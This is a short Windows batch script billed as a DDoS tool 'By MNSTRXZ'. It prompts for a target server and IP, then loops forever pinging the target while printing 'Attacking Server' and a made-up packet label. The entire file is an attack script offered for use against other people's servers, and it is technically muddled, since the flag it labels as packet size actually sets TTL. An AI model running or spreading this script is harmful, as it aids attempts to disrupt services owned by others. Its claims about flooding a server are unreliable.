��
 @echo off 
 mode 67,16
 title DDOS 34gl4 MAX MNSTRXZ
 color 0a
 cls
 echo.
 echo ����������������������������������������������������������������?
 echo DDOS With 34gl3 By MNSTRXZ
 echo ����������������������������������������������������������������?
 echo.
 set /p x=Server-Target:
 echo.
 echo ����������������������������������������������������������������?
 ping %x%
 echo ����������������������������������������������������������������?
 @ping.exe 127.0.0.1 -n 5 -w 1000 > nul
 goto Next
 :Next
 echo.
 echo.
 echo.
 set /p m=ip Host:
 echo.
 set /p n=Packet Size:
 echo.
 :DDOS
 color 0d
echo Attacking Server %m%
echo Sending Packet 897-FJH-8KO-[.%
ping %m% -i %n% -t >nul
 goto DDOS